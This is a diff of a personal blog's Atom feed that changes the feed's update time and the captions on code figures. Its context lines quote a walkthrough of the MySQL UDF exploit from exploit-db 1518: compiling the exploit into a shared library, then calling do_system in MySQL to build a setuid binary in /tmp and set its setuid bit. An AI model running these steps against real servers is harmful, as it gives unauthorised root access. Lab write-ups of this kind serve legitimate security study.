@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-08-16T16:51:34-05:00</updated>
+  <updated>2016-08-16T16:53:10-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -196,9 +196,9 @@
 
 <p>follow the instruction <code>https://www.exploit-db.com/exploits/1518/</code></p>
 
-<p>use the c code:</p>
+<p>use the c code:(1518.c)</p>
 
-<figure class='code'><figcaption><span>1518.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -273,7 +273,7 @@
 
 
 
-<figure class='code'><figcaption><span>1518.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 </pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">gcc</span> <span class="o">-</span><span class="n">g</span> <span class="o">-</span><span class="n">c</span> <span class="mf">1518.</span><span class="n">c</span>
 </span><span class='line'><span class="n">gcc</span> <span class="o">-</span><span class="n">g</span> <span class="o">-</span><span class="n">shared</span> <span class="o">-</span><span class="n">Wl</span><span class="p">,</span><span class="o">-</span><span class="n">soname</span><span class="p">,</span><span class="mf">1518.</span><span class="n">so</span> <span class="o">-</span><span class="n">o</span> <span class="mf">1518.</span><span class="n">so</span> <span class="mf">1518.</span><span class="n">o</span> <span class="o">-</span><span class="n">lc</span>
@@ -282,7 +282,7 @@
 
 <p>in mysql</p>
 
-<figure class='code'><figcaption><span>1518.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -309,7 +309,7 @@
 
 <p>in mysql:</p>
 
-<figure class='code'><figcaption><span>1518.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 </pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="n">select</span> <span class="n">do_system</span><span class="p">(</span><span class="err">&#39;</span><span class="n">gcc</span> <span class="o">-</span><span class="n">o</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">suid</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">suid</span><span class="p">.</span><span class="n">c</span><span class="err">&#39;</span><span class="p">);</span>
 </span><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="n">select</span> <span class="n">do_system</span><span class="p">(</span><span class="err">&#39;</span><span class="n">chmod</span> <span class="n">u</span><span class="o">+</span><span class="n">s</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">suid</span><span class="err">&#39;</span><span class="p">);</span>
